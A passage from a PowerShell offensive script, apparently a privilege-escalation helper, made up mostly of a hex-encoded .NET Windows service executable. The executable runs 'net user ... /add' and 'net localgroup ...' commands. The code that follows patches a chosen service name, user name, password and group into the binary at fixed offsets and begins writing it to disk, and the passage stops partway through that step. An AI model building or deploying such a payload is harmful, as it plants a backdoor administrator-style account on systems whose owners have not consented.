0x43,0x61,0x6e,0x53,0x74,0x6f,0x70,0x00,0x52,0x75,0x6e,0x00,0x43,0x6f,0x6e,0x63,0x61,0x74,0x00,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x49,0x6e,0x66,0x6f,0x00,0x73,0x65,0x74,0x5f,0x52,0x65,0x64,0x69,0x72,0x65,0x63,0x74,0x53,0x74,0x61,0x6e,0x64,0x61,0x72,0x64,0x4f,0x75,0x74,0x70,0x75,0x74,0x00,0x73,0x65,0x74,0x5f,0x55,0x73,0x65,0x53,0x68,0x65,0x6c,0x6c,0x45,0x78,0x65,0x63,0x75,0x74,0x65,0x00,0x73,0x65,0x74,0x5f,0x43,0x72,0x65,0x61,0x74,0x65,0x4e,0x6f,0x57,0x69,0x6e,0x64,0x6f,0x77,0x00,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x00,0x73,0x65,0x74,0x5f,0x53,0x74,0x61,0x72,0x74,0x49,0x6e,0x66,0x6f,0x00,0x53,0x74,0x61,0x72,0x74,0x00,0x43,0x6f,0x6d,0x70,0x69,0x6c,0x65,0x72,0x47,0x65,0x6e,0x65,0x72,0x61,0x74,0x65,0x64,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x43,0x6f,0x64,0x65,0x44,0x6f,0x6d,0x2e,0x43,0x6f,0x6d,0x70,0x69,0x6c,0x65,0x72,0x00,0x47,0x65,0x6e,0x65,0x72,0x61,0x74,0x65,0x64,0x43,0x6f,0x64,0x65,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x2e,0x63,0x63,0x74,0x6f,0x72,0x00,0x53,0x65,0x74,0x74,0x69,0x6e,0x67,0x73,0x42,0x61,0x73,0x65,0x00,0x53,0x79,0x6e,0x63,0x68,0x72,0x6f,0x6e,0x69,0x7a,0x65,0x64,0x00,0x00,0x00,0x00,0x00,0x3d,0x53,0x00,0x45,0x00,0x52,0x00,0x56,0x00,0x49,0x00,0x43,0x00,0x45,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x00,0x3d,0x55,0x00,0x53,0x00,0x45,0x00,0x52,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x00,0x3d,0x50,0x00,0x41,0x00,0x53,0x00,0x53,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x00,0x3d,0x47,0x00,0x52,0x00,0x4f,0x00,0x55,0x00,0x50,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x20,0x00,0x00,0x07,0x63,0x00,0x6d,0x00,0x64,0x00,0x00,0x19,0x2f,0x00,0x63,0x00,0x20,0x00,0x6e,0x00,0x65,0x00,0x74,0x00,0x20,0x00,0x75,0x00,0x73,0x00,0x65,0x00,0x72,0x00,0x20,0x00,0x00,0x03,0x20,0x00,0x00,0x0b,0x20,0x00,0x2f,0x00,0x61,0x00,0x64,0x00,0x64,0x00,0x00,0x25,0x2f,0x00,0x63,0x00,0x20,0x00,0x6e,0x00,0x65,0x00,0x74,0x00,0x20,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x67,0x00,0x72,0x00,0x6f,0x00,0x75,0x00,0x70,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x06,0xbc,0x09,0x96,0xcc,0x29,0x11,0x46,0x9a,0xd5,0xc8,0x71,0x09,0x4c,0x31,0x3d,0x00,0x08,0xb0,0x3f,0x5f,0x7f,0x11,0xd5,0x0a,0x3a,0x08,0xb7,0x7a,0x5c,0x56,0x19,0x34,0xe0,0x89,0x03,0x20,0x00,0x01,0x03,0x00,0x00,0x01,0x05,0x20,0x01,0x01,0x1d,0x0e,0x03,0x06,0x12,0x0c,0x04,0x00,0x00,0x12,0x0c,0x04,0x08,0x00,0x12,0x0c,0x04,0x20,0x01,0x01,0x0e,0x04,0x20,0x01,0x01,0x02,0x05,0x20,0x01,0x01,0x11,0x41,0x04,0x20,0x01,0x01,0x08,0x03,0x20,0x00,0x0e,0x03,0x07,0x01,0x0e,0x05,0x00,0x01,0x01,0x12,0x05,0x05,0x00,0x01,0x0e,0x1d,0x0e,0x05,0x20,0x02,0x01,0x0e,0x0e,0x05,0x20,0x01,0x01,0x12,0x51,0x03,0x20,0x00,0x02,0x11,0x07,0x09,0x0e,0x0e,0x0e,0x12,0x51,0x12,0x55,0x12,0x51,0x12,0x55,0x1d,0x0e,0x1d,0x0e,0x04,0x01,0x00,0x00,0x00,0x58,0x01,0x00,0x4b,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2e,0x56,0x69,0x73,0x75,0x61,0x6c,0x53,0x74,0x75,0x64,0x69,0x6f,0x2e,0x45,0x64,0x69,0x74,0x6f,0x72,0x73,0x2e,0x53,0x65,0x74,0x74,0x69,0x6e,0x67,0x73,0x44,0x65,0x73,0x69,0x67,0x6e,0x65,0x72,0x2e,0x53,0x65,0x74,0x74,0x69,0x6e,0x67,0x73,0x53,0x69,0x6e,0x67,0x6c,0x65,0x46,0x69,0x6c,0x65,0x47,0x65,0x6e,0x65,0x72,0x61,0x74,0x6f,0x72,0x07,0x39,0x2e,0x30,0x2e,0x30,0x2e,0x30,0x00,0x00,0x06,0x00,0x01,0x12,0x61,0x12,0x61,0x0c,0x01,0x00,0x07,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x00,0x00,0x05,0x01,0x00,0x00,0x00,0x00,0x17,0x01,0x00,0x12,0x43,0x6f,0x70,0x79,0x72,0x69,0x67,0x68,0x74,0x20,0xc2,0xa9,0x20,0x20,0x32,0x30,0x31,0x34,0x00,0x00,0x29,0x01,0x00,0x24,0x63,0x36,0x62,0x65,0x63,0x64,0x37,0x36,0x2d,0x39,0x66,0x66,0x65,0x2d,0x34,0x61,0x37,0x64,0x2d,0x38,0x63,0x61,0x65,0x2d,0x37,0x34,0x37,0x62,0x64,0x36,0x32,0x35,0x65,0x35,0x35,0x36,0x00,0x00,0x0c,0x01,0x00,0x07,0x31,0x2e,0x30,0x2e,0x30,0x2e,0x30,0x00,0x00,0x08,0x01,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x08,0x01,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x1e,0x01,0x00,0x01,0x00,0x54,0x02,0x16,0x57,0x72,0x61,0x70,0x4e,0x6f,0x6e,0x45,0x78,0x63,0x65,0x70,0x74,0x69,0x6f,0x6e,0x54,0x68,0x72,0x6f,0x77,0x73,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x69,0x99,0x56,0x53,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x74,0x00,0x00,0x00,0x28,0x2c,0x00,0x00,0x28,0x0e,0x00,0x00,0x52,0x53,0x44,0x53,0xc8,0x9f,0x29,0x44,0xfc,0x3b,0xab,0x4f,0x9c,0x66,0x08,0x7d,0xce,0x32,0xd8,0xf3,0x01,0x00,0x00,0x00,0x43,0x3a,0x5c,0x55,0x73,0x65,0x72,0x73,0x5c,0x61,0x64,0x61,0x6d,0x5c,0x44,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x73,0x5c,0x56,0x69,0x73,0x75,0x61,0x6c,0x20,0x53,0x74,0x75,0x64,0x69,0x6f,0x20,0x32,0x30,0x30,0x38,0x5c,0x50,0x72,0x6f,0x6a,0x65,0x63,0x74,0x73,0x5c,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x5c,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x5c,0x6f,0x62,0x6a,0x5c,0x52,0x65,0x6c,0x65,0x61,0x73,0x65,0x5c,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x2e,0x70,0x64,0x62,0x00,0xc4,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xde,0x2c,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x5f,0x43,0x6f,0x72,0x45,0x78,0x65,0x4d,0x61,0x69,0x6e,0x00,0x6d,0x73,0x63,0x6f,0x72,0x65,0x65,0x2e,0x64,0x6c,0x6c,0x00,0x00,0x00,0x00,0x00,0xff,0x25,0x00,0x20,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x10,0x00,0x00,0x00,0x20,0x00,0x00,0x80,0x18,0x00,0x00,0x00,0x38,0x00,0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x50,0x00,0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x68,0x00,0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0xa0,0x40,0x00,0x00,0xa0,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x43,0x00,0x00,0xea,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa0,0x02,0x34,0x00,0x00,0x00,0x56,0x00,0x53,0x00,0x5f,0x00,0x56,0x00,0x45,0x00,0x52,0x00,0x53,0x00,0x49,0x00,0x4f,0x00,0x4e,0x00,0x5f,0x00,0x49,0x00,0x4e,0x00,0x46,0x00,0x4f,0x00,0x00,0x00,0x00,0x00,0xbd,0x04,0xef,0xfe,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x00,0x01,0x00,0x56,0x00,0x61,0x00,0x72,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x49,0x00,0x6e,0x00,0x66,0x00,0x6f,0x00,0x00,0x00,0x00,0x00,0x24,0x00,0x04,0x00,0x00,0x00,0x54,0x00,0x72,0x00,0x61,0x00,0x6e,0x00,0x73,0x00,0x6c,0x00,0x61,0x00,0x74,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x04,0x00,0x02,0x00,0x00,0x01,0x00,0x53,0x00,0x74,0x00,0x72,0x00,0x69,0x00,0x6e,0x00,0x67,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x49,0x00,0x6e,0x00,0x66,0x00,0x6f,0x00,0x00,0x00,0xdc,0x01,0x00,0x00,0x01,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x34,0x00,0x62,0x00,0x30,0x00,0x00,0x00,0x38,0x00,0x08,0x00,0x01,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x44,0x00,0x65,0x00,0x73,0x00,0x63,0x00,0x72,0x00,0x69,0x00,0x70,0x00,0x74,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x00,0x00,0x30,0x00,0x08,0x00,0x01,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x31,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x00,0x00,0x38,0x00,0x0c,0x00,0x01,0x00,0x49,0x00,0x6e,0x00,0x74,0x00,0x65,0x00,0x72,0x00,0x6e,0x00,0x61,0x00,0x6c,0x00,0x4e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x00,0x00,0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00,0x48,0x00,0x12,0x00,0x01,0x00,0x4c,0x00,0x65,0x00,0x67,0x00,0x61,0x00,0x6c,0x00,0x43,0x00,0x6f,0x00,0x70,0x00,0x79,0x00,0x72,0x00,0x69,0x00,0x67,0x00,0x68,0x00,0x74,0x00,0x00,0x00,0x43,0x00,0x6f,0x00,0x70,0x00,0x79,0x00,0x72,0x00,0x69,0x00,0x67,0x00,0x68,0x00,0x74,0x00,0x20,0x00,0xa9,0x00,0x20,0x00,0x20,0x00,0x32,0x00,0x30,0x00,0x31,0x00,0x34,0x00,0x00,0x00,0x40,0x00,0x0c,0x00,0x01,0x00,0x4f,0x00,0x72,0x00,0x69,0x00,0x67,0x00,0x69,0x00,0x6e,0x00,0x61,0x00,0x6c,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x00,0x00,0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00,0x30,0x00,0x08,0x00,0x01,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x64,0x00,0x75,0x00,0x63,0x00,0x74,0x00,0x4e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x00,0x00,0x00,0x00,0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x00,0x00,0x34,0x00,0x08,0x00,0x01,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x64,0x00,0x75,0x00,0x63,0x00,0x74,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x31,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x00,0x00,0x38,0x00,0x08,0x00,0x01,0x00,0x41,0x00,0x73,0x00,0x73,0x00,0x65,0x00,0x6d,0x00,0x62,0x00,0x6c,0x00,0x79,0x00,0x20,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x31,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x00,0x00,0xef,0xbb,0xbf,0x3c,0x3f,0x78,0x6d,0x6c,0x20,0x76,0x65,0x72,0x73,0x69,0x6f,0x6e,0x3d,0x22,0x31,0x2e,0x30,0x22,0x20,0x65,0x6e,0x63,0x6f,0x64,0x69,0x6e,0x67,0x3d,0x22,0x55,0x54,0x46,0x2d,0x38,0x22,0x20,0x73,0x74,0x61,0x6e,0x64,0x61,0x6c,0x6f,0x6e,0x65,0x3d,0x22,0x79,0x65,0x73,0x22,0x3f,0x3e,0x0d,0x0a,0x3c,0x61,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x20,0x78,0x6d,0x6c,0x6e,0x73,0x3d,0x22,0x75,0x72,0x6e,0x3a,0x73,0x63,0x68,0x65,0x6d,0x61,0x73,0x2d,0x6d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x63,0x6f,0x6d,0x3a,0x61,0x73,0x6d,0x2e,0x76,0x31,0x22,0x20,0x6d,0x61,0x6e,0x69,0x66,0x65,0x73,0x74,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x3d,0x22,0x31,0x2e,0x30,0x22,0x3e,0x0d,0x0a,0x20,0x20,0x3c,0x61,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x49,0x64,0x65,0x6e,0x74,0x69,0x74,0x79,0x20,0x76,0x65,0x72,0x73,0x69,0x6f,0x6e,0x3d,0x22,0x31,0x2e,0x30,0x2e,0x30,0x2e,0x30,0x22,0x20,0x6e,0x61,0x6d,0x65,0x3d,0x22,0x4d,0x79,0x41,0x70,0x70,0x6c,0x69,0x63,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x61,0x70,0x70,0x22,0x2f,0x3e,0x0d,0x0a,0x20,0x20,0x3c,0x74,0x72,0x75,0x73,0x74,0x49,0x6e,0x66,0x6f,0x20,0x78,0x6d,0x6c,0x6e,0x73,0x3d,0x22,0x75,0x72,0x6e,0x3a,0x73,0x63,0x68,0x65,0x6d,0x61,0x73,0x2d,0x6d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x63,0x6f,0x6d,0x3a,0x61,0x73,0x6d,0x2e,0x76,0x32,0x22,0x3e,0x0d,0x0a,0x20,0x20,0x20,0x20,0x3c,0x73,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x3e,0x0d,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x3c,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x50,0x72,0x69,0x76,0x69,0x6c,0x65,0x67,0x65,0x73,0x20,0x78,0x6d,0x6c,0x6e,0x73,0x3d,0x22,0x75,0x72,0x6e,0x3a,0x73,0x63,0x68,0x65,0x6d,0x61,0x73,0x2d,0x6d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x63,0x6f,0x6d,0x3a,0x61,0x73,0x6d,0x2e,0x76,0x33,0x22,0x3e,0x0d,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x3c,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x45,0x78,0x65,0x63,0x75,0x74,0x69,0x6f,0x6e,0x4c,0x65,0x76,0x65,0x6c,0x20,0x6c,0x65,0x76,0x65,0x6c,0x3d,0x22,0x61,0x73,0x49,0x6e,0x76,0x6f,0x6b,0x65,0x72,0x22,0x20,0x75,0x69,0x41,0x63,0x63,0x65,0x73,0x73,0x3d,0x22,0x66,0x61,0x6c,0x73,0x65,0x22,0x2f,0x3e,0x0d,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x3c,0x2f,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x50,0x72,0x69,0x76,0x69,0x6c,0x65,0x67,0x65,0x73,0x3e,0x0d,0x0a,0x20,0x20,0x20,0x20,0x3c,0x2f,0x73,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x3e,0x0d,0x0a,0x20,0x20,0x3c,0x2f,0x74,0x72,0x75,0x73,0x74,0x49,0x6e,0x66,0x6f,0x3e,0x0d,0x0a,0x3c,0x2f,0x61,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x3e,0x0d,0x0a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x0c,0x00,0x00,0x00,0xf0,0x3c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00;

    # get the unicode byte conversions of all arguments
    $enc = [System.Text.Encoding]::Unicode
    $ServiceNameBytes = $enc.GetBytes($ServiceName)
    $UserNameBytes = $enc.GetBytes($UserName)
    $PasswordBytes = $enc.GetBytes($Password)
    $GroupNameBytes = $enc.GetBytes($GroupName)

    # patch all values in to their appropriate locations
    for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) { 
        # service name offset = 2870
        $Binary[$i+2870] = $ServiceNameBytes[$i]
    }
    for ($i=0; $i -lt ($UserNameBytes.Length); $i++) { 
        # user name offset = 2932
        $Binary[$i+2932] = $UserNameBytes[$i]
    }
    for ($i=0; $i -lt ($PasswordBytes.Length); $i++) { 
        # password offset = 2994
        $Binary[$i+2994] = $PasswordBytes[$i]
    }
    for ($i=0; $i -lt ($GroupNameBytes.Length); $i++) { 
        # group name offset = 3056
        $Binary[$i+3056] = $GroupNameBytes[$i]
    }

    try {
        # write the binary array out to the specified path
        Set-Content -value $Binary -encoding byte -path $Path
